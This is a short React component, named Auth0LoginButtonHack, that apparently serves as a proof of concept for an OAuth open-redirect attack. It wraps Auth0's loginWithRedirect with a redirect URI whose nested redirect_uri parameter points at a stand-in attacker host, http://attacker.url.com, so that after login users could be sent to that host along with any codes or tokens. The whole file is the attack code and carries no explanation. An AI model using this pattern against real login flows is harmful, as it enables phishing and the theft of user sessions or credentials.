import React from "react";
import { withAuth0 } from "@auth0/auth0-react";
import { LOGIN_CALLBACK_URI } from './constants';
class Auth0LoginButtonHack extends React.Component {
  render() {
    const customedRedirectUri = `${window.location.origin}/${LOGIN_CALLBACK_URI}?redirect_uri=http://attacker.url.com`;  
    const { loginWithRedirect } = this.props.auth0;
    return (
      <button
       
        className="btn btn-primary btn-block btn-transparent"
        onClick={() => loginWithRedirect({  authorizationParams: {redirect_uri: customedRedirectUri}})}>
       H
      </button>
    );
  }
}

export default withAuth0(Auth0LoginButtonHack);